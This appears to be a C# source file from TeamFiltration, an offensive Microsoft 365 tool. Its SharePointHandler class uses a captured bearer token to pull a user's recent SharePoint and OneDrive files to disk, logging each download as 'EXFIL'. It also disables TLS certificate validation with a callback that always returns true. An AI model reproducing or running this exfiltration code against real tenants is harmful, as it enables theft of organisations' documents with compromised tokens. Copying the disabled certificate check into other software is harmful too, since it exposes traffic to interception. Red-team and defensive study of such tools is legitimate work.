using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using TeamFiltration.Models.MSOL;
using TeamFiltration.Models.TeamFiltration;
using TeamFiltration.Models.Teams;
using TeamFiltration.Helpers;
using KoenZomers.OneDrive.Api;
using System.Security.Authentication;

namespace TeamFiltration.Handlers
{
    class SharePointHandler
    {
        private HttpClient _sharePointClient;

        private BearerTokenResp _getBearToken { get; set; }
        private GlobalArgumentsHandler _teamFiltrationConfig { get; set; }
        private DatabaseHandler _databaseHandler { get; set; }
        private string _username { get; set; }


        public SharePointHandler(BearerTokenResp getBearToken, string username, GlobalArgumentsHandler teamFiltrationConfig, DatabaseHandler databaseHandler, bool debugMode = false)
        {
            this._getBearToken = getBearToken;
            this._username = username;
            this._databaseHandler = databaseHandler;
            _teamFiltrationConfig = teamFiltrationConfig;

            var proxy = new WebProxy
            {
                Address = new Uri($"http://127.0.0.1:8080"),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,
            };

            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {
                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = debugMode
            };

            _sharePointClient = new HttpClient(httpClientHandler);
            _sharePointClient.DefaultRequestHeaders.Add("Authorization", $"Bearer {getBearToken.access_token}");
        }

  

        public async Task<DownloadUrlResp> GetDownloadInfo(string baseUrl)
        {
            var getDownloadInfoReq = await _sharePointClient.PollyGetAsync($"{baseUrl}/driveItem?select=@microsoft.graph.downloadUrl");
            var getDownloadInfoResp = await getDownloadInfoReq.Content.ReadAsStringAsync();
            return JsonConvert.DeserializeObject<DownloadUrlResp>(getDownloadInfoResp);
        }

        public async Task DownloadRecentFiles(TeamsFileResp recentFiles, string outPath, string module)
        {

            var newOutPath = Path.Combine(outPath, "RecentFiles");

            Directory.CreateDirectory(newOutPath);

            using (var webClient = new WebClient())
            {

                foreach (var file in recentFiles.value.Where(x => x.objectUrl.StartsWith(_getBearToken.resource)))
                {
                    try
                    {
                        _databaseHandler.WriteLog(new Log("EXFIL", "-->" + file.title));

                        if (file.siteInfo.siteUrl == null)
                        {
                            file.siteInfo.siteUrl = _getBearToken.resource + "/_api/v2.0/shares/u!" + Convert.ToBase64String(Encoding.UTF8.GetBytes(file.objectUrl)).Replace("=", "");
                        }
                        else
                        {
                            file.siteInfo.siteUrl += "/_api/v2.0/sites/root/items/" + file.objectId;
                        }
                        var downloadInfo = await GetDownloadInfo(file.siteInfo.siteUrl);
                        webClient.DownloadFile(downloadInfo.ContentDownloadUrl, Path.Combine(newOutPath, file.title));
                    }
                    catch (Exception e)
                    {
                        _databaseHandler.WriteLog(new Log(module, $"Failed to download file {file.title}"));
                    }
                }
            }
        }
    }
}
